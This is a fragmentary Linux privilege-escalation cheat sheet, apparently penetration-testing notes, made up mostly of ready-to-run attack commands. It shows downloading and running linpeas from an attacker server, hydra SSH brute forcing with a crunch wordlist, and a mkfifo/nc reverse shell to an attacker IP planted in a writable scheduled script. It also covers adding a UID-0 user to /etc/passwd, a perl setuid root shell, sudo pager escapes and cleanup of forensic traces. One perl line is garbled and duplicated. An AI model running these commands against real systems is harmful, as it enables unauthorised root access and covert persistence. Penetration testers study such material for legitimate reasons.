...
- Feed results into **[GTFOBins](https://gtfobins.org/)** or **[escabin](https://medtrigui.github.io/escabin/)** (detailed SUID/capability exploits).
- Leverage binary documentation to craft custom payloads.
...
```bash
wget http://<attacker-server>/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh | tee /tmp/linpeas.log
```

- Color-coded output highlights "High" and "Very High" priority findings.
- Cross-reference any SUID binaries or capabilities discovered with **[GTFOBins](https://gtfobins.org/)**.
...
```bash
crunch 6 6 -t Pattern%%% -o /tmp/wordlist
hydra -l <username> -P /tmp/wordlist ssh://<target-ip> -t 4 -V
```

- Seed wordlists with discovered patterns; test across local users, services, VPNs, and sudo.
- Extract common patterns from environment variables, config files, and shell history.
...
```bash
cat <<'EOF' >> /path/to/writable/scheduled_script.sh
rm /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/bash -i 2>&1 | nc <ATTACKER_IP> <PORT> >/tmp/f
EOF
nc -lnvp <PORT>
```
...
```bash
ls -l /etc/passwd
openssl passwd -6 '<password>'           # Generate SHA512 hash
echo 'user:$6$<hash>:0:0:root:/root:/bin/bash' | tee -a /etc/passwd
su - user
```

- UID/GID `0` grants full root access. Prefer SHA512 (`-6`) to ensure compatibility with modern PAM configs.
- Requires write access to `/etc/passwd` (often world-writable in weak configurations).
...
### Example Exploits
For detailed exploit chains, always check **[GTFOBins](https://gtfobins.org/)** first.
...
- **Interpreter with `cap_setuid+ep`:**

```bash
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

See **[GTFOBins](https://gtfobins.org/)** for comprehensive SUID/capability exploit patterns.r/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```
...
For comprehensive sudo exploitation patterns, consult **[GTFOBins](https://gtfobins.org/#+sudo)**.

- **Pagers (less/more/vim)**: `sudo <pager> /etc/passwd` → escape to shell `!<command>`
- **Package managers**: `sudo <package-manager> changelog <package>` → spawn editor/pager
- **Service managers**: `sudo systemctl status <service>` → press `!<command>` inside pager
- **Archive/utility tools**: Use built-in hooks (`tar --checkpoint-action`, `rsync --use-compress-program`, `find -exec`)
...
- Prefer compiling on the target to avoid dependency mismatches.
- Clean up binaries and forensic artifacts per engagement rules.

### Notable Vulnerable Patterns
```bash
ls -lah /usr/bin/<binary>*
```
